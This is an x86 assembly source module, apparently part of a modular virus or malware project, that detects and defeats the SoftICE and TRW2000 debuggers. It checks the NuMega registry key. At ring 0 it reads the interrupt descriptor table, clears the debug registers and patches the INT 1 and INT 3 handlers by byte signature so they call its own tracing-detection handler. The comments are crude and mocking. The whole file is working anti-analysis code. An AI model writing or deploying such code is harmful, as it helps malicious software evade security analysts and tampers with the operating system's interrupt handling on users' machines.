
include                 FUCKICE.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\R0COPY\r0copy.inc
include                 ..\MAIN\main.inc

                        extern  Event:PROC
                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

icekey                  db      'Software\NuMega',0
checkice_complete       db      0
fuckice_complete        db      0

new_addr                dd      ?
                        dd      new1
                        dd      ?
                        dd      new3

old_addr                dd      ?
old1                    dd      ?
                        dd      ?
old3                    dd      ?

                        .code

HandleEvent:            mov     eax, [esp+4]    ; event_id
                        cmp     eax, EV_R0COPY_IDLE
                        je      __fuckice
                        cmp     eax, EV_MAIN_IDLE
                        je      __checkice

__return_0:             xor     eax, eax
                        retn

__checkice:
                        cmp     checkice_complete, 0
                        jne     __return_0
                        inc     checkice_complete

                        callW   GetVersion
                        shl     eax, 1
                        jc      __return_0
                        ; winNT

                        push    offset icekey
                        push    HKEY_LOCAL_MACHINE
                        callW   is_key
                        or      eax, eax
                        jz      __return_0
                        ;1=key exists

                        ; it is not tracing, but cant detect it on winNT/r3,
                        ; so, bye-bye, motherfucker ;-)
                        push    0
                        push    EV_FUCKICE_TRACING
                        call    Event
                        add     esp,8

                        mov     eax, 1
                        retn

__fuckice:
                        cmp     fuckice_complete, 0
                        jne     __return_0
                        inc     fuckice_complete

                        call    fuckice

                        mov     eax, 1
                        retn

fuckice:                pusha

                        xor     eax, eax        ; clear BPX's
                        mov     dr6, eax

                        sidt    [esp-6]
                        mov     ebx, [esp-4]

                        xor     edx, edx

                        mov     cl, 01h
                        call    fuckint
                        mov     cl, 03h
                        call    fuckint

                        or      edx, edx
                        jz      __exit

                        push    0
                        push    EV_FUCKICE_PATCHED
                        call    Event
                        add     esp, 8

__exit:                 popa
                        retn

fuckint:                movzx   ecx, cl
                        mov     eax, [ebx+ecx*8+6-2]  ; EAX=int addr
                        mov     ax,  [ebx+ecx*8+0]    ;

                        mov     esi, [eax]
                        and     esi, 00FFFFFFh
                        cmp     esi, 00E86050h  ; TRW2000
                        je      __patch_trw

                        cmp     byte ptr [eax], 68h     ; softice signature
                        jne     __skip
                        cmp     byte ptr [eax+5], 0E9h  ; -//-
                        jne     __skip

__patch_ice:            ; +00 68 xxxxxxxx
                        ; +05 E9 xxxxxxxx
                        ; +0A ...
                        add     eax, 10

__patch_both:           inc     edx     ; id: something patched

                        mov     esi, eax
                        add     esi, [eax-4]
                        mov     old_addr[ecx*4], esi

                        mov     edi, new_addr[ecx*4]
                        sub     edi, eax
                        mov     [eax-4], edi

__skip:                 retn

__patch_trw:            ; +00  50
                        ; +01  60
                        ; +02  E8 xxxxxxxx
                        ; +07  ...
                        add     eax, 7
                        jmp     __patch_both

new1:                   call    handler
                        jmp     ss:old1

new3:                   call    handler
                        jmp     ss:old3

handler:                pushf
                        pusha

                        xor     eax, eax        ; clear BPX's
                        mov     dr6, eax

                        push    ds es fs gs

                        mov     eax, ss
                        mov     ds, eax
                        mov     es, eax
                        cld

                        push    0
                        push    EV_FUCKICE_TRACING
                        call    Event
                        add     esp, 8

                        pop     gs fs es ds

                        popa
                        popf
                        retn

                        end
